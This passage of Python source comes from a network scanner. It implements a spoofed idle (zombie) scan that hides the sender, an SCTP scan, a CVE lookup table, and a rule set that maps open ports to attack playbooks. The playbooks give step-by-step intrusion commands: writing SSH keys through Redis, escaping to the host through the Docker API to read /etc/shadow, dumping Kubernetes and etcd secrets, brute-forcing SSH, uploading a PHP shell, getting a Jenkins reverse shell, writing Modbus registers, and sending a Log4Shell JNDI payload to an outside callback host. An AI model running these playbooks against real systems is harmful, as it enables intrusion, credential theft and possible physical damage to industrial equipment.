        time.sleep(0.05)

    diffs = []
    for i in range(1, len(ids)):
        d = (ids[i] - ids[i-1]) & 0xFFFF
        diffs.append(d)

    if all(d <= 3 for d in diffs):
        return True, f"IPID increments: {diffs} — suitable zombie"
    elif all(d == 0 for d in diffs):
        return False, "IPID=0 always (randomised or constant) — not suitable"
    else:
        return False, f"IPID unpredictable: {diffs} — not suitable"


def idle_scan(target_ip: str, ports: List[int],
              zombie_ip: str, zombie_port: int = 80,
              timeout: float = 2.0) -> Dict[int, PortResult]:
    """
    [ENH-12] Idle scan (zombie scan) — Nmap -sI equivalent.

    Uses zombie_ip as a blind intermediary.  Our real IP never sends
    a packet to the target — all traffic appears to come from zombie.

    Steps per port:
        1. Probe zombie → record IPID₁
        2. Spoof SYN from zombie_ip to (target, port)
        3. Probe zombie → record IPID₂
        4. IPID₂ - IPID₁ == 2 → OPEN;  == 1 → CLOSED/FILTERED

    Requires raw socket access (root/sudo).
    Requires zombie with predictable sequential IPID (check first).
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except (PermissionError, OSError):
        return results

    src_ip = get_local_ip(target_ip)

    for dst_port in ports:
        # Step 1: probe zombie, get IPID₁
        id1 = _probe_zombie_ipid(zombie_ip, timeout)
        if id1 is None:
            continue

        # Step 2: spoof SYN from zombie_ip to target:dst_port
        try:
            pkt = _build_syn_packet(zombie_ip, target_ip,
                                     zombie_port, dst_port,
                                     random.randint(0, 0xFFFFFFFF))
            send_sock.sendto(pkt, (target_ip, 0))
        except OSError:
            continue

        time.sleep(0.1)  # give zombie time to receive target's reply

        # Step 3: probe zombie, get IPID₂
        id2 = _probe_zombie_ipid(zombie_ip, timeout)
        if id2 is None:
            continue

        delta = (id2 - id1) & 0xFFFF

        r = results[dst_port]
        if delta == 2:
            r.state   = "open"
            r.reason  = f"idle-scan (IPID delta=2, zombie={zombie_ip})"
            r.service = service_name(dst_port)
        elif delta == 1:
            r.state  = "closed"
            r.reason = f"idle-scan (IPID delta=1)"
        else:
            r.state  = "filtered"
            r.reason = f"idle-scan (IPID delta={delta}, ambiguous)"

    send_sock.close()
    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-13] SCTP SCAN
# ═══════════════════════════════════════════════════════════════════
#
# Stream Control Transmission Protocol (SCTP) is used heavily in
# telecom (SS7 over IP, Diameter, SIP), 3GPP (LTE/5G), and some
# cloud infrastructure.  Nmap supports SCTP INIT and SCTP COOKIE-ECHO.
#
# SCTP INIT scan (like SYN scan):
#   Send INIT chunk → INIT-ACK means OPEN, ABORT means CLOSED
#
# SCTP packet structure (simplified):
#   Common header: src_port(2), dst_port(2), vtag(4), checksum(4)
#   Chunk:         type(1), flags(1), length(2), value(variable)
#
# CRC-32c checksum (RFC 4960) is used instead of IP checksum.
# ═══════════════════════════════════════════════════════════════════

def _crc32c(data: bytes) -> int:
    """
    [ENH-13] CRC-32c (Castagnoli) used by SCTP (RFC 4960 §6.8).
    Uses the iSCSI/SCTP polynomial 0x1EDC6F41.
    """
    # Pre-computed table for CRC-32c
    crc = 0xFFFFFFFF
    poly = 0x82F63B78   # reflected polynomial for CRC-32c
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
    return crc ^ 0xFFFFFFFF


def _build_sctp_init(src_ip: str, dst_ip: str,
                      src_port: int, dst_port: int) -> bytes:
    """
    [ENH-13] Build an SCTP INIT packet.

    SCTP common header:
        src_port(2) dst_port(2) vtag(4) checksum(4)
    INIT chunk (type=0x01):
        type(1) flags(1) length(2) initiate_tag(4) a_rwnd(4)
        outbound_streams(2) inbound_streams(2) initial_tsn(4)
    """
    ip_src    = socket.inet_aton(src_ip)
    ip_dst    = socket.inet_aton(dst_ip)
    vtag      = 0   # vtag=0 for INIT
    itag      = random.randint(1, 0xFFFFFFFF)
    init_tsn  = random.randint(0, 0xFFFFFFFF)

    # INIT chunk body (no optional parameters for simplicity)
    init_body = struct.pack("!IIHHI", itag, 0xFFFF, 1, 1, init_tsn)
    chunk_len = 4 + len(init_body)  # chunk header (4) + body
    chunk = struct.pack("!BBH", 0x01, 0x00, chunk_len) + init_body

    # SCTP common header (checksum = 0 initially)
    sctp_hdr_nc = struct.pack("!HHII", src_port, dst_port, vtag, 0)
    sctp_payload = sctp_hdr_nc + chunk

    # CRC-32c over the whole SCTP datagram
    crc = _crc32c(sctp_payload)
    sctp_payload = struct.pack("!HHII",
        src_port, dst_port, vtag, crc) + chunk

    # IP header
    total_len = 20 + len(sctp_payload)
    ttl       = random.choice([64, 128])
    ip_id     = random.randint(0, 0xFFFF)
    ip_nc     = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, ip_id, 0,
        ttl, 132, 0,        # protocol 132 = SCTP
        ip_src, ip_dst)
    ip_chk    = checksum(ip_nc)
    ip_hdr    = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, total_len, ip_id, 0,
        ttl, 132, ip_chk,
        ip_src, ip_dst)

    return ip_hdr + sctp_payload


def sctp_scan(ip: str, ports: List[int],
              timeout: float = 2.0) -> Dict[int, PortResult]:
    """
    [ENH-13] SCTP INIT scan — Nmap --scanflags SCTP equivalent.

    Sends an SCTP INIT chunk to each port.
    INIT-ACK (type=0x02) → OPEN
    ABORT   (type=0x06) → CLOSED
    No response         → FILTERED

    Requires raw sockets (root/sudo).
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="sctp",
                      state="filtered", reason="no-response")
        for p in ports
    }
    if not ports:
        return results

    src_ip = get_local_ip(ip)
    SCTP_PROTO = 132

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  SCTP_PROTO)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        return results

    port_set = set(ports)
    src_ports: Dict[int, int] = {}   # dst_port → src_port used

    try:
        # Send phase
        for dst_port in ports:
            src_port = random.randint(32768, 60999)
            src_ports[dst_port] = src_port
            pkt = _build_sctp_init(src_ip, ip, src_port, dst_port)
            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip, 0))
            except OSError:
                pass

        # Receive phase
        deadline = time.time() + timeout
        seen: set = set()
        while time.time() < deadline and len(seen) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if addr[0] != ip:
                continue
            # SCTP common header: src(2) dst(2) vtag(4) chk(4) = 12 bytes
            if len(data) < 12:
                continue
            sctp_dst = struct.unpack("!H", data[2:4])[0]
            if sctp_dst not in {src_ports.get(p) for p in ports}:
                continue
            sctp_src = struct.unpack("!H", data[0:2])[0]
            if sctp_src not in port_set:
                continue
            # First chunk starts at offset 12
            if len(data) < 13:
                continue
            chunk_type = data[12]
            r = results[sctp_src]
            if chunk_type == 0x02:    # INIT-ACK → open
                r.state   = "open"
                r.reason  = "sctp-init-ack"
                r.service = service_name(sctp_src, "sctp")
                seen.add(sctp_src)
            elif chunk_type == 0x06:  # ABORT → closed
                r.state  = "closed"
                r.reason = "sctp-abort"
                seen.add(sctp_src)

    finally:
        send_sock.close()
        recv_sock.close()

    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-14] CVE LOOKUP ENGINE
# ═══════════════════════════════════════════════════════════════════
#
# After banner grabbing identifies a service version, this engine:
#   1. Parses the version string into (product, version)
#   2. Looks up matching CVEs in a bundled local database
#   3. Optionally queries the NVD REST API v2.0 for live results
#
# The local DB covers the most critical/commonly-seen CVEs so the
# scanner works fully offline.  API enrichment adds recency.
# ═══════════════════════════════════════════════════════════════════

import urllib.request as _urllib_request
import urllib.parse   as _urllib_parse

@dataclass
class CveRecord:
    cve_id:      str
    description: str
    cvss:        float          # CVSS v3 base score
    severity:    str            # CRITICAL / HIGH / MEDIUM / LOW
    products:    List[str]      # lowercase product name fragments to match

    def __str__(self) -> str:
        return (f"{self.cve_id}  [{self.severity} CVSS:{self.cvss:.1f}]  "
                f"{self.description}")


# ── Bundled local CVE database ─────────────────────────────────────
# Format: product name fragments (all must appear in version string,
# case-insensitive) → list of CVEs.
CVE_LOCAL_DB: List[CveRecord] = [

    # Apache httpd
    CveRecord("CVE-2021-41773", "Path traversal and RCE in Apache 2.4.49",
              9.8, "CRITICAL", ["apache", "2.4.49"]),
    CveRecord("CVE-2021-42013", "Path traversal and RCE in Apache 2.4.49/2.4.50",
              9.8, "CRITICAL", ["apache", "2.4.50"]),
    CveRecord("CVE-2017-9798",  "Optionsbleed: memory disclosure via HTTP OPTIONS",
              7.5, "HIGH",     ["apache", "2.2"]),
    CveRecord("CVE-2014-6271",  "Shellshock: RCE via Bash CGI in Apache",
              10.0,"CRITICAL", ["apache", "bash"]),

    # nginx
    CveRecord("CVE-2021-23017", "1-byte heap overflow in nginx resolver",
              9.4, "CRITICAL", ["nginx"]),
    CveRecord("CVE-2019-9511",  "HTTP/2 Data Dribble DoS in nginx",
              7.5, "HIGH",     ["nginx"]),

    # OpenSSH
    CveRecord("CVE-2023-38408", "ssh-agent RCE via PKCS#11 provider",
              9.8, "CRITICAL", ["openssh"]),
    CveRecord("CVE-2023-51385", "OS command injection via username in OpenSSH",
              6.5, "MEDIUM",   ["openssh"]),
    CveRecord("CVE-2021-28041", "Double-free in ssh-agent in OpenSSH < 8.5",
              7.8, "HIGH",     ["openssh", "8."]),
    CveRecord("CVE-2016-6515",  "DoS via password auth in OpenSSH < 7.4",
              7.5, "HIGH",     ["openssh", "7."]),
    CveRecord("CVE-2016-0777",  "Client-side info-leak (roaming) in OpenSSH",
              6.4, "MEDIUM",   ["openssh", "7.1"]),

    # OpenSSL / TLS
    CveRecord("CVE-2014-0160",  "Heartbleed: private key disclosure via TLS heartbeat",
              7.5, "HIGH",     ["openssl", "1.0.1"]),
    CveRecord("CVE-2022-0778",  "Infinite loop in BN_mod_sqrt (DoS) in OpenSSL",
              7.5, "HIGH",     ["openssl"]),
    CveRecord("CVE-2021-3449",  "NULL ptr dereference in OpenSSL TLS renegotiation",
              5.9, "MEDIUM",   ["openssl"]),

    # MySQL / MariaDB
    CveRecord("CVE-2016-6662",  "MySQL RCE via config file write",
              10.0,"CRITICAL", ["mysql"]),
    CveRecord("CVE-2012-2122",  "MySQL auth bypass via timing attack",
              7.5, "HIGH",     ["mysql", "5."]),
    CveRecord("CVE-2021-27928", "MariaDB RCE via wsrep provider path",
              7.2, "HIGH",     ["mariadb"]),

    # PostgreSQL
    CveRecord("CVE-2019-9193",  "RCE via COPY TO/FROM PROGRAM in PostgreSQL",
              7.2, "HIGH",     ["postgresql"]),

    # Redis
    CveRecord("CVE-2022-0543",  "Lua sandbox escape → RCE in Redis (Debian pkg)",
              10.0,"CRITICAL", ["redis"]),
    CveRecord("CVE-2021-32675", "Infinite loop DoS via RESP3 in Redis < 6.2.6",
              7.5, "HIGH",     ["redis"]),

    # MongoDB
    CveRecord("CVE-2021-20328", "Client-side cert validation bypass in MongoDB driver",
              6.5, "MEDIUM",   ["mongodb"]),

    # SMB / Windows
    CveRecord("CVE-2017-0144",  "EternalBlue: SMB RCE (WannaCry/NotPetya)",
              9.8, "CRITICAL", ["smb"]),
    CveRecord("CVE-2020-0796",  "SMBGhost: SMBv3 compression RCE",
              10.0,"CRITICAL", ["smb"]),
    CveRecord("CVE-2019-0708",  "BlueKeep: RDP pre-auth RCE on Windows 7/2008",
              9.8, "CRITICAL", ["rdp"]),
    CveRecord("CVE-2021-34527", "PrintNightmare: Windows Print Spooler RCE",
              8.8, "HIGH",     ["windows", "print"]),

    # IIS
    CveRecord("CVE-2017-7269",  "IIS 6.0 WebDAV buffer overflow RCE",
              10.0,"CRITICAL", ["iis", "6.0"]),
    CveRecord("CVE-2021-31166", "HTTP protocol stack RCE in IIS",
              9.8, "CRITICAL", ["iis"]),

    # Samba
    CveRecord("CVE-2017-7494",  "SambaCry: RCE via writable share in Samba",
              9.8, "CRITICAL", ["samba"]),
    CveRecord("CVE-2021-44142", "OOB RW in Samba vfs_fruit module",
              9.9, "CRITICAL", ["samba"]),

    # vsftpd / ProFTPD
    CveRecord("CVE-2011-2523",  "vsftpd 2.3.4 backdoor: shell on port 6200",
              10.0,"CRITICAL", ["vsftpd", "2.3.4"]),
    CveRecord("CVE-2010-4221",  "ProFTPD RCE via Telnet IAC handling",
              10.0,"CRITICAL", ["proftpd", "1.3.2"]),

    # PHP
    CveRecord("CVE-2021-21705", "SSRF via PHP filter url in PHP < 8.0.7",
              5.3, "MEDIUM",   ["php"]),
    CveRecord("CVE-2019-11043", "RCE via path handling in PHP-FPM + nginx",
              9.8, "CRITICAL", ["php", "fpm"]),

    # Elasticsearch
    CveRecord("CVE-2021-22145", "Memory info disclosure in Elasticsearch",
              6.5, "MEDIUM",   ["elasticsearch"]),
    CveRecord("CVE-2014-3120",  "Dynamic scripting RCE in Elasticsearch < 1.6",
              7.5, "HIGH",     ["elasticsearch"]),

    # Docker
    CveRecord("CVE-2019-5736",  "runc container escape via /proc/self/exe overwrite",
              8.6, "HIGH",     ["docker"]),
    CveRecord("CVE-2022-0492",  "Cgroups v1 container escape in Linux kernel",
              7.8, "HIGH",     ["docker", "container"]),

    # Kubernetes
    CveRecord("CVE-2018-1002105","Privilege escalation via k8s API server proxy",
              9.8, "CRITICAL", ["kubernetes"]),
    CveRecord("CVE-2019-11246", "Path traversal in kubectl cp",
              6.5, "MEDIUM",   ["kubernetes"]),

    # Log4j
    CveRecord("CVE-2021-44228", "Log4Shell: JNDI injection RCE in Log4j2",
              10.0,"CRITICAL", ["log4j"]),
    CveRecord("CVE-2021-45046", "Log4Shell bypass in Log4j2 < 2.16",
              9.0, "CRITICAL", ["log4j"]),

    # Memcached
    CveRecord("CVE-2018-1000115","Memcached UDP amplification (reflection DDoS)",
              7.5, "HIGH",     ["memcached"]),

    # Exim
    CveRecord("CVE-2019-10149", "RCE in Exim < 4.92 via MAIL FROM",
              9.8, "CRITICAL", ["exim", "4."]),

    # Postfix
    CveRecord("CVE-2023-51764", "SMTP smuggling in Postfix",
              5.3, "MEDIUM",   ["postfix"]),

    # Dovecot
    CveRecord("CVE-2022-30550", "Privilege escalation in Dovecot auth",
              8.8, "HIGH",     ["dovecot"]),

    # Tomcat
    CveRecord("CVE-2020-1938",  "Ghostcat: AJP file read/inclusion in Tomcat",
              9.8, "CRITICAL", ["tomcat"]),
    CveRecord("CVE-2019-0232",  "RCE in CGI servlet on Windows Tomcat",
              8.1, "HIGH",     ["tomcat"]),

    # Spring
    CveRecord("CVE-2022-22965", "Spring4Shell: RCE in Spring MVC",
              9.8, "CRITICAL", ["spring"]),
    CveRecord("CVE-2022-22963", "Spring Cloud Function SpEL injection RCE",
              9.8, "CRITICAL", ["spring"]),

    # Jenkins
    CveRecord("CVE-2019-1003000","Jenkins sandbox bypass → RCE",
              8.8, "HIGH",     ["jenkins"]),

    # GitLab
    CveRecord("CVE-2021-22205", "GitLab RCE via ExifTool image upload",
              10.0,"CRITICAL", ["gitlab"]),

    # Confluence
    CveRecord("CVE-2022-26134", "OGNL injection RCE in Confluence Server",
              10.0,"CRITICAL", ["confluence"]),

    # Cisco
    CveRecord("CVE-2018-0171",  "Cisco Smart Install RCE (port 4786)",
              9.8, "CRITICAL", ["cisco"]),

    # VNC
    CveRecord("CVE-2019-15681", "LibVNCServer memory leak / info disclosure",
              7.5, "HIGH",     ["vnc"]),

    # SNMP
    CveRecord("CVE-2017-6736",  "Cisco IOS SNMP RCE",
              9.8, "CRITICAL", ["snmp", "cisco"]),

    # Modbus / ICS
    CveRecord("CVE-2022-30622", "Auth bypass in Modbus-based SCADA systems",
              9.1, "CRITICAL", ["modbus"]),
]

# Build product → CVE index for O(1) lookup
_CVE_INDEX: Dict[str, List[CveRecord]] = {}
for _cve in CVE_LOCAL_DB:
    for _prod in _cve.products[:1]:   # index by first (primary) product
        _CVE_INDEX.setdefault(_prod.lower(), []).append(_cve)


def lookup_cves_local(version_string: str) -> List[CveRecord]:
    """
    [ENH-14] Match a banner/version string against the local CVE DB.
    Returns all matching CveRecords sorted by CVSS score descending.
    """
    vs_lower  = version_string.lower()
    matches: List[CveRecord] = []
    for cve in CVE_LOCAL_DB:
        if all(frag.lower() in vs_lower for frag in cve.products):
            matches.append(cve)
    return sorted(matches, key=lambda c: -c.cvss)


def lookup_cves_nvd(cpe_keyword: str,
                     max_results: int = 5,
                     timeout: float = 5.0) -> List[CveRecord]:
    """
    [ENH-14] Query the NVD REST API v2.0 for CVEs matching cpe_keyword.
    Falls back silently to [] on network error (scanner stays offline-capable).

    API: https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=X
    """
    results: List[CveRecord] = []
    try:
        kw  = _urllib_parse.quote(cpe_keyword)
        url = (f"https://services.nvd.nist.gov/rest/json/cves/2.0"
               f"?keywordSearch={kw}&resultsPerPage={max_results}")
        req = _urllib_request.Request(url, headers={"User-Agent": "PyScanner/1.0"})
        with _urllib_request.urlopen(req, timeout=timeout) as resp:
            import json as _json
            data = _json.loads(resp.read())
        for item in data.get("vulnerabilities", []):
            cve_data = item.get("cve", {})
            cve_id   = cve_data.get("id", "")
            descs    = cve_data.get("descriptions", [])
            desc     = next((d["value"] for d in descs if d.get("lang") == "en"), "")
            metrics  = cve_data.get("metrics", {})
            cvss_v3  = (metrics.get("cvssMetricV31") or
                        metrics.get("cvssMetricV30") or [])
            score    = 0.0
            sev      = "UNKNOWN"
            if cvss_v3:
                score = cvss_v3[0]["cvssData"].get("baseScore", 0.0)
                sev   = cvss_v3[0]["cvssData"].get("baseSeverity", "UNKNOWN")
            results.append(CveRecord(
                cve_id=cve_id, description=desc[:120],
                cvss=float(score), severity=sev,
                products=[cpe_keyword.lower()]))
    except Exception:
        pass
    return sorted(results, key=lambda c: -c.cvss)


def run_cve_lookup(version_string: str,
                    use_nvd: bool = False) -> List[CveRecord]:
    """
    [ENH-14] Combined CVE lookup: local DB first, optionally enrich via NVD.
    """
    found = lookup_cves_local(version_string)
    if use_nvd and not found:
        # Extract first meaningful word as search keyword
        kw = version_string.split()[0] if version_string.split() else ""
        if kw:
            found = lookup_cves_nvd(kw)
    return found


# ═══════════════════════════════════════════════════════════════════
# [ENH-15] AI RECON ENGINE  — Attack path analysis
# ═══════════════════════════════════════════════════════════════════
#
# After a scan completes, the AI recon engine:
#   1. Groups open services by category (web, db, auth, etc.)
#   2. Matches known attack chains from a rules database
#   3. Scores each attack path by likelihood + impact
#   4. Produces a ranked list of recommended follow-up tests
#
# This runs entirely offline — no LLM API required.
# The rules engine uses a structured knowledge base of attack patterns.
# ═══════════════════════════════════════════════════════════════════

@dataclass
class AttackPath:
    name:        str
    confidence:  str      # HIGH / MEDIUM / LOW
    impact:      str      # CRITICAL / HIGH / MEDIUM / LOW
    steps:       List[str]
    tools:       List[str]
    ports:       List[int]   # which open ports triggered this

    def __str__(self) -> str:
        return (f"[{self.impact}] {self.name}  (confidence: {self.confidence})\n"
                + "\n".join(f"  {i+1}. {s}" for i, s in enumerate(self.steps)))


# ── Attack pattern rule database ──────────────────────────────────
# Each rule: (name, required_ports, required_services, confidence, impact, steps, tools)
_ATTACK_RULES: List[Dict] = [
    {   "name": "EternalBlue (MS17-010) / WannaCry",
        "ports": [445], "services": ["smb"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["Check SMB dialect with nmap -p445 --script smb-security-mode",
                  "Test MS17-010: nmap --script smb-vuln-ms17-010",
                  "Exploit with Metasploit: exploit/windows/smb/ms17_010_eternalblue",
                  "Dump hashes with secretsdump.py after shell"],
        "tools": ["nmap", "metasploit", "impacket"]
    },
    {   "name": "SMBGhost (CVE-2020-0796) SMBv3 compression",
        "ports": [445], "services": ["smb", "smbv3"],
        "confidence": "MEDIUM", "impact": "CRITICAL",
        "steps": ["Confirm SMBv3 with: nmap -p445 --script smb2-capabilities",
                  "Check Windows version (SMBGhost affects Win10 1903/1909)",
                  "PoC: github.com/chompie1337/SMBGhost_RCE_PoC"],
        "tools": ["nmap", "custom PoC"]
    },
    {   "name": "BlueKeep RDP pre-auth RCE (CVE-2019-0708)",
        "ports": [3389], "services": ["rdp"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["Check Windows version (affects Win7/2008 R2)",
                  "Scan: nmap -p3389 --script rdp-vuln-ms12-020",
                  "Exploit: Metasploit exploit/windows/rdp/cve_2019_0708_bluekeep_rce"],
        "tools": ["nmap", "metasploit"]
    },
    {   "name": "Unauthenticated Redis access",
        "ports": [6379], "services": ["redis"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Connect: redis-cli -h TARGET",
                  "Run: CONFIG SET dir /home/user/.ssh",
                  "Run: CONFIG SET dbfilename authorized_keys",
                  "Set key with your pubkey content and SAVE",
                  "SSH in as user"],
        "tools": ["redis-cli"]
    },
    {   "name": "Unauthenticated MongoDB access",
        "ports": [27017], "services": ["mongodb"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Connect: mongo TARGET:27017",
                  "Run: show dbs",
                  "Dump: mongodump --host TARGET --out /tmp/dump"],
        "tools": ["mongo", "mongodump"]
    },
    {   "name": "Unauthenticated Elasticsearch data dump",
        "ports": [9200], "services": ["elasticsearch"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["List indices: curl http://TARGET:9200/_cat/indices",
                  "Dump index: curl http://TARGET:9200/INDEX/_search?size=1000",
                  "Check for sensitive data in default indices"],
        "tools": ["curl"]
    },
    {   "name": "Docker API unauthenticated RCE",
        "ports": [2375], "services": ["docker"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["List containers: curl http://TARGET:2375/containers/json",
                  "Create privileged container: docker -H tcp://TARGET:2375 run --privileged ...",
                  "Mount host filesystem and read /etc/shadow or add SSH keys"],
        "tools": ["curl", "docker"]
    },
    {   "name": "Kubernetes API unauthenticated access",
        "ports": [8080, 6443], "services": ["kubernetes"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["Check: curl http://TARGET:8080/api/v1/namespaces",
                  "List secrets: kubectl --server=http://TARGET:8080 get secrets -A",
                  "Deploy privileged pod to escape to host"],
        "tools": ["curl", "kubectl"]
    },
    {   "name": "LAMP stack — web + database",
        "ports": [80, 3306], "services": ["http", "mysql"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Spider web app: gobuster dir -u http://TARGET -w common.txt",
                  "Check phpMyAdmin at /phpmyadmin, /pma",
                  "Test MySQL: mysql -h TARGET -u root (empty password)",
                  "Test SQLi in web forms: sqlmap -u 'http://TARGET/?id=1'"],
        "tools": ["gobuster", "sqlmap", "mysql"]
    },
    {   "name": "LAMP stack — web + PostgreSQL",
        "ports": [80, 5432], "services": ["http", "postgresql"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Spider web app: gobuster dir -u http://TARGET -w common.txt",
                  "Test PostgreSQL: psql -h TARGET -U postgres (empty password)",
                  "Use COPY TO PROGRAM for RCE if authenticated"],
        "tools": ["gobuster", "psql"]
    },
    {   "name": "SSH brute force / default credentials",
        "ports": [22], "services": ["ssh"],
        "confidence": "MEDIUM", "impact": "HIGH",
        "steps": ["Enumerate users: ssh-audit TARGET",
                  "Brute force: hydra -L users.txt -P pass.txt ssh://TARGET",
                  "Try defaults: root:root, admin:admin, pi:raspberry"],
        "tools": ["ssh-audit", "hydra"]
    },
    {   "name": "FTP anonymous login",
        "ports": [21], "services": ["ftp"],
        "confidence": "HIGH", "impact": "MEDIUM",
        "steps": ["Test: ftp TARGET → user: anonymous, pass: anything",
                  "If writable: upload PHP shell, access via web server",
                  "Check for sensitive files in FTP root"],
        "tools": ["ftp"]
    },
    {   "name": "Telnet cleartext credentials",
        "ports": [23], "services": ["telnet"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Connect: telnet TARGET 23",
                  "Try defaults: admin/admin, root/root, cisco/cisco",
                  "Capture traffic on LAN with tcpdump (cleartext protocol)"],
        "tools": ["telnet", "tcpdump"]
    },
    {   "name": "SMTP open relay",
        "ports": [25], "services": ["smtp"],
        "confidence": "MEDIUM", "impact": "MEDIUM",
        "steps": ["Test relay: swaks --to victim@external.com --server TARGET",
                  "Enumerate users: smtp-user-enum -M VRFY -U users.txt -t TARGET",
                  "Check for STARTTLS downgrade"],
        "tools": ["swaks", "smtp-user-enum"]
    },
    {   "name": "SNMP community string enumeration",
        "ports": [161], "services": ["snmp"],
        "confidence": "HIGH", "impact": "MEDIUM",
        "steps": ["Try 'public': snmpwalk -v 1 -c public TARGET",
                  "Brute community strings: onesixtyone -c strings.txt TARGET",
                  "Dump full MIB: snmpwalk -v 2c -c public TARGET .1"],
        "tools": ["snmpwalk", "onesixtyone"]
    },
    {   "name": "etcd unauthenticated Kubernetes secrets",
        "ports": [2379, 2380], "services": ["etcd"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["List keys: etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only",
                  "Dump k8s secrets: etcdctl get /registry/secrets --prefix",
                  "Decode base64 values to recover service account tokens"],
        "tools": ["etcdctl"]
    },
    {   "name": "Jenkins unauthenticated Script Console RCE",
        "ports": [8080], "services": ["jenkins"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["Browse http://TARGET:8080/script",
                  "Execute Groovy: println 'id'.execute().text",
                  "Add SSH key or reverse shell via script console"],
        "tools": ["curl", "browser"]
    },
    {   "name": "Grafana unauthenticated access",
        "ports": [3000], "services": ["grafana"],
        "confidence": "HIGH", "impact": "MEDIUM",
        "steps": ["Browse http://TARGET:3000 (default: admin/admin)",
                  "Check data sources — may contain DB credentials",
                  "Use snapshot or CSV export to exfiltrate metrics"],
        "tools": ["browser"]
    },
    {   "name": "VNC no authentication",
        "ports": [5900, 5901], "services": ["vnc"],
        "confidence": "HIGH", "impact": "HIGH",
        "steps": ["Connect: vncviewer TARGET:5900 (no password)",
                  "Screen control gives full desktop access",
                  "Install persistent backdoor or exfiltrate files"],
        "tools": ["vncviewer"]
    },
    {   "name": "Modbus/ICS unauthenticated access",
        "ports": [502], "services": ["modbus"],
        "confidence": "HIGH", "impact": "CRITICAL",
        "steps": ["Enumerate with: mbtget -r 1 -a 1 TARGET",
                  "Read holding registers: mbtget -r 3 -n 100 TARGET",
                  "Write coils/registers to manipulate physical process",
                  "Alert: any interaction with ICS may cause physical damage"],
        "tools": ["mbtget", "modbuspal"]
    },
    {   "name": "Log4Shell via HTTP headers",
        "ports": [80, 443, 8080, 8443], "services": ["http", "https"],
        "confidence": "MEDIUM", "impact": "CRITICAL",
        "steps": ["Inject: curl -H 'X-Api-Version: ${jndi:ldap://COLLAB/x}' http://TARGET/",
                  "Use Burp collaborator or interactsh to detect callback",
                  "If callback received: deploy exploit payload",
                  "Patch: upgrade to Log4j >= 2.17.0"],
        "tools": ["curl", "interactsh", "burpsuite"]
    },
]


def analyze_attack_paths(host_result: "HostResult") -> List[AttackPath]:
    """
    [ENH-15] Analyze a scan result and return ranked attack paths.

    Matches open ports and service banners against _ATTACK_RULES.
    Returns paths sorted by impact (CRITICAL first) then confidence.
    """
    open_ports    = {r.port for r in host_result.ports.values()
                     if r.state == "open"}
    open_services = {r.service.lower() for r in host_result.ports.values()
                     if r.state == "open" and r.service}
    open_versions = " ".join(
        (r.version or "") for r in host_result.ports.values()
        if r.state == "open"
    ).lower()

    paths: List[AttackPath] = []
    impact_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

    for rule in _ATTACK_RULES:
        # Port match: at least one required port must be open
        port_match = any(p in open_ports for p in rule["ports"])
        # Service match: at least one required service name in detected services
        svc_match  = any(s in open_services or s in open_versions
                         for s in rule["services"])
        if port_match or svc_match:
            paths.append(AttackPath(
                name       = rule["name"],
                confidence = rule["confidence"],
                impact     = rule["impact"],
                steps      = rule["steps"],
                tools      = rule["tools"],
                ports      = [p for p in rule["ports"] if p in open_ports],
            ))

    # Sort: CRITICAL first, then HIGH, then by confidence
    conf_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    paths.sort(key=lambda p: (impact_order.get(p.impact, 9),
                               conf_order.get(p.confidence, 9)))
    return paths


def print_attack_paths(host_result: "HostResult",
                        max_paths: int = 10,
                        verbose: bool = False) -> None:
    """[ENH-15] Print ranked attack paths to stdout."""
    paths = analyze_attack_paths(host_result)
    if not paths:
        print(color(f"  [AI] No attack paths identified for {host_result.ip}", YELLOW))
        return

    print(color(f"\n{'═'*60}", CYAN))
    print(color(f"  AI RECON — Attack Paths for {host_result.ip}", CYAN))
    print(color(f"  {len(paths)} path(s) identified", CYAN))
    print(color(f"{'═'*60}", CYAN))

    impact_colors = {"CRITICAL": RED, "HIGH": YELLOW, "MEDIUM": CYAN, "LOW": GREEN}
    for i, path in enumerate(paths[:max_paths], 1):
        col = impact_colors.get(path.impact, WHITE)
        print(color(f"\n  [{i}] {path.name}", col))
        print(color(f"      Impact: {path.impact}  "
                    f"Confidence: {path.confidence}  "
                    f"Ports: {path.ports}", col))
        if verbose:
            for step in path.steps:
                print(f"        → {step}")
            print(f"      Tools: {', '.join(path.tools)}")

    print()


# ═══════════════════════════════════════════════════════════════════
# [ENH-16] HTML + PDF REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════════
#
# Generates a professional standalone HTML pentest report from scan
